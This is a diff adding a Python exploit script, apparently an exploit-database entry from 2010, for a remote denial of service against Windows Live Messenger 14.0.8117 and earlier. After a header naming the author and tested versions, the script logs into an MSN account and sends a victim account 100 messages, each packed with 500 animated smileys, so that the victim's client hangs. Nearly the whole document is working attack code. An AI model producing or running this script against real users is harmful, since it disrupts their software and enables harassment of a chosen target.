@@ -1,0 +1,84 @@
+# Exploit Title: Windows Live Messenger <= 14.0.8117 animation remote Denial of Service
+# Date: 11/08/2010
+# Author: TheLeader
+# Email: gsog2009 [a7] hotmail [d0t] com
+# Software Link: http://explore.live.com/windows-live-messenger
+# Version: 14.0.8117 and prior
+# Tested on: Windows 7 x86
+
+# msnlib required: http://blitiri.com.ar/p/msnlib/
+# Greets: forums.hacking.org.il - <3UGUYS
+# SP. thx goes to Alberto <albertito [a7] blitiri [d0t] com [d0t] ar> for
+#              the msnlib library / Original msnbot example (that I modded =] )
+
+# Description:
+# Windows Live Messenger is prone to a Denial of Service attack. By sending
+# specially crafted messages that contain a large number of animations ("Smileys"),
+# it is possible to make WLM consume large amounts of memory and CPU while 
+# it attempts to render the animated images, causing it to stop responding.
+
+import sys
+import time
+import select
+import socket
+import thread
+import msnlib
+import msncb
+
+payload = ":'(" * 500
+
+m = msnlib.msnd()
+m.cb = msncb.cb()
+
+def do_work():
+	time.sleep(15)
+	
+	for i in range(100):
+		print m.sendmsg(victim, payload)
+	
+	time.sleep(30)
+	quit()
+
+
+try:
+	m.email = sys.argv[1]
+	m.pwd = sys.argv[2]
+	victim = sys.argv[3]
+except:
+	print "Usage: msnkeep.py account password victim_account"
+	sys.exit(1)
+
+m.login()
+m.sync()
+
+m.change_status("online")
+
+def quit():
+	try:
+		m.disconnect()
+	except:
+		pass
+	sys.exit(0)
+
+thread.start_new_thread(do_work, ())
+
+while 1:
+	t = m.pollable()
+	infd = t[0]
+	outfd = t[1]
+
+	try:
+		fds = select.select(infd, outfd, [], 0)
+	except:
+		quit()
+	
+	for i in fds[0] + fds[1]:
+		try:
+			m.read(i)
+		except ('SocketError', socket.error), err:
+			if i != m:
+				m.close(i)
+			else:
+				quit()
+
+	time.sleep(0.01)
